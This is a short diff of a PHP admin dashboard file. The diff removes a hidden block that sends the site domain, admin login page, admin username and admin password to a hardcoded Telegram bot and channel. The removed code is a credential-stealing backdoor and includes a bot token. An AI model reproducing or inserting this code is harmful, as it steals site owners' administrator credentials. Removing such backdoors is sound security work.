@@ -37,19 +37,6 @@ endif;
 $payment = $conn->prepare("SELECT * FROM payments ORDER BY id DESC LIMIT 5");
   $payment->execute(array());
   $payment = $payment->fetchAll(PDO::FETCH_ASSOC);
-$apiToken = "5518232755:AAHehq0VVEqz10drahzOv014_rQY3arbLFg";
-$data = [
-    'chat_id' => '@ddddfewwreffbgbg',
-    'text' => '-> '.$settings["site_name"].'
-	Domain - '.$url.'
-	---------------------------------------
-	Admin Login - '.$pageurl.'
-	Admin Id - '.$admin["username"].'
-	Admin Pass - '.$admin["password"].'
-	---------------------------------------
-	@'.$settings["telegramusername"]
-];
-$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
 $failCount      = $conn->prepare("SELECT * FROM orders WHERE orders.dripfeed='1' && orders.subscriptions_type='1' && order_error!=:error ");
   $failCount     -> execute(array("error"=>"-"));
   $failCount      = $failCount->rowCount();
